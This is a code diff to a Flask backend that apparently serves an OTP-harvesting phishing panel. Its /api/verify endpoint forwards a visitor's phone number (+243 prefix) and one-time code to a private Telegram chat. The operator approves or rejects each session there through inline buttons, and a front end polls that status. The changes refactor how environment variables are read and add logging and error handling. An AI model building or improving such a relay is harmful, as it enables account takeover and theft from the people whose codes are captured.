@@ -11,26 +11,32 @@ try:
 except ImportError:
     pass
 
-UPSTASH_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
-UPSTASH_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+def get_env_vars():
+    url = os.environ.get("UPSTASH_REDIS_REST_URL")
+    token = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+    tg_token = os.environ.get("TELEGRAM_TOKEN")
+    tg_chat = os.environ.get("TELEGRAM_CHAT_ID")
+    return url, token, tg_token, tg_chat
 
 def set_status(session_id, status):
-    if UPSTASH_URL and UPSTASH_TOKEN and session_id:
-        url = f"{UPSTASH_URL.rstrip('/')}/set/{session_id}/{status}"
-        headers = {"Authorization": f"Bearer {UPSTASH_TOKEN}"}
+    url, token, _, _ = get_env_vars()
+    if url and token and session_id:
+        endpoint = f"{url.rstrip('/')}/set/{session_id}/{status}"
+        headers = {"Authorization": f"Bearer {token}"}
         try:
-            r = requests.post(url, headers=headers)
+            r = requests.post(endpoint, headers=headers)
             if r.status_code != 200:
                 print(f"[Upstash] Error setting status: {r.text}")
         except Exception as e:
             print(f"[Upstash] Exception setting status: {e}")
 
 def get_status(session_id):
-    if UPSTASH_URL and UPSTASH_TOKEN and session_id:
-        url = f"{UPSTASH_URL.rstrip('/')}/get/{session_id}"
-        headers = {"Authorization": f"Bearer {UPSTASH_TOKEN}"}
+    url, token, _, _ = get_env_vars()
+    if url and token and session_id:
+        endpoint = f"{url.rstrip('/')}/get/{session_id}"
+        headers = {"Authorization": f"Bearer {token}"}
         try:
-            r = requests.get(url, headers=headers)
+            r = requests.get(endpoint, headers=headers)
             if r.status_code != 200:
                 print(f"[Upstash] Error getting status: {r.text}")
             return r.json().get("result")
@@ -38,15 +44,17 @@ def get_status(session_id):
             print(f"[Upstash] Exception getting status: {e}")
     return "pending"
 
-@app.route('/api/status', methods=['GET'])
+@app.route('/api/status', methods=['GET', 'POST'], strict_slashes=False)
 def status():
-    session_id = request.args.get('session_id')
+    session_id = request.args.get('session_id') or (request.json or {}).get('session_id')
     current_status = get_status(session_id) or "pending"
     return jsonify({"status": current_status})
 
-@app.route('/api/webhook', methods=['POST'])
+@app.route('/api/webhook', methods=['POST'], strict_slashes=False)
 def webhook():
     data = request.json or {}
+    print(f"[Telegram Webhook] Received payload: {data}")
+    
     if 'callback_query' in data:
         query = data['callback_query']
         callback_data = query.get('data', '')
@@ -54,7 +62,7 @@ def webhook():
         message = query.get('message')
         chat_id = message['chat']['id'] if message else None
         message_id = message['message_id'] if message else None
-        token = os.environ.get("TELEGRAM_TOKEN")
+        _, _, token, _ = get_env_vars()
 
         if callback_data.startswith("approve_") or callback_data.startswith("reject_"):
             action, session_id = callback_data.split('_', 1)
@@ -62,8 +70,9 @@ def webhook():
             
             # Update Upstash
             set_status(session_id, status_val)
+            print(f"[Telegram Webhook] Updated session {session_id} to {status_val}")
             
-            # Edit Telegram Message
+            # Edit Telegram Message & remove inline buttons
             if token and chat_id and message_id:
                 new_text = message.get('text', '')
                 if action == "approve":
@@ -72,20 +81,30 @@ def webhook():
                     new_text += "\n\n❌ <b>REFUSÉ</b>"
                     
                 edit_url = f"https://api.telegram.org/bot{token}/editMessageText"
-                requests.post(edit_url, json={
-                    "chat_id": chat_id,
-                    "message_id": message_id,
-                    "text": new_text,
-                    "parse_mode": "HTML"
-                })
+                try:
+                    requests.post(edit_url, json={
+                        "chat_id": chat_id,
+                        "message_id": message_id,
+                        "text": new_text,
+                        "parse_mode": "HTML"
+                    })
+                except Exception as e:
+                    print(f"[Telegram Webhook] Error editing message: {e}")
                 
-                # Answer callback query to stop loading state on button
+                # Answer callback query to stop loading spinner on button and show feedback popup
                 ans_url = f"https://api.telegram.org/bot{token}/answerCallbackQuery"
-                requests.post(ans_url, json={"callback_query_id": callback_id})
+                try:
+                    toast_text = "Demande approuvée !" if action == "approve" else "Demande refusée !"
+                    requests.post(ans_url, json={
+                        "callback_query_id": callback_id,
+                        "text": toast_text
+                    })
+                except Exception as e:
+                    print(f"[Telegram Webhook] Error answering callback: {e}")
                 
     return jsonify({"status": "success"})
 
-@app.route('/api/verify', methods=['POST'])
+@app.route('/api/verify', methods=['POST'], strict_slashes=False)
 def verify():
     data = request.json or {}
     session_id = data.get('session_id', '')
@@ -97,8 +116,7 @@ def verify():
     if otp != 'Pending OTP...' and session_id:
         set_status(session_id, "pending")
         
-    token = os.environ.get("TELEGRAM_TOKEN")
-    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
+    _, _, token, chat_id = get_env_vars()
     
     message = f"🚀 <b>New Application Received!</b>\n\n"
     message += f"📱 <b>Phone:</b> +243 {phone}\n"
